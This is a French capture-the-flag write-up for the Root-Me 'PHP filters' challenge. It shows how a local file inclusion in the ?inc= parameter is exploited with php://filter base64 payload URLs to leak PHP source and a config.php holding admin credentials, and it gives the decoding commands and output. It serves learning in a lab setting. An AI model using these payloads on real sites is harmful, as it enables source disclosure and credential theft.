# PHP Filters

La page du [challenge](https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-filters)

## Analyse

On remarque d'une attaque LFI est possible dans l'URL sur la variable `?inc=`.

C'est gràce aux cappers PHP que l'on va pouvoir récupérer le contenue de fichier php, codé en base64.

## Attaque

En cliquant sur les liens _home_ et _login_, on remarque dans la variabl _inc_ de l'URL deux pages php, **acceuil.php** et **login.php**.

On commence par récupérer le contenue du fichier **login.php*.
```
http://chall/?inc=php://filter/convert.base64-encode/resource=index.php
PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg==
```

On décode le résultat en base64.
```
$ echo "PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg==" | base64 -d
<?php include("ch12.php");?>
```

On récupère le contenue du fichier **ch12.php**.
```
http://chall/?inc=php://filter/convert.base64-encode/resource=ch12.php
PD9waHAKCiRpbmM9ImFjY3VlaWwucGhwIjsKaWYgKGlzc2V0KCRfR0VUWyJpbmMiXSkpIHsKICAgICRpbmM9JF9HRVRb...
```

On le décode.
```php
<?php
$inc="accueil.php";
if (isset($_GET["inc"])) {
    $inc=$_GET['inc'];
    if (file_exists($inc)){
	$f=basename(realpath($inc));
	if ($f == "index.php" || $f == "ch12.php"){
	    $inc="accueil.php";
	}
    }
}

include("config.php");

echo '
  <html>
  <body>
    <h1>FileManager v 0.01</h1>
    <ul>
	<li><a href="?inc=accueil.php">home</a></li>
	<li><a href="?inc=login.php">login</a></li>
    </ul>
';
include($inc);
echo '
  </body>
  </html>
';
?>
```

On recommence les même étapes avec le fichier **config.php**. On aurait pu tester dès le début avec le fichier _config.php_, car c'est un nom par défaut pour ce genre de fichier.
```
http://chall/?inc=php://filter/convert.base64-encode/resource=config.php

$ echo "PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg==" | base64 -d
<?php
$username="admin";
$password="************";
?>% 
```
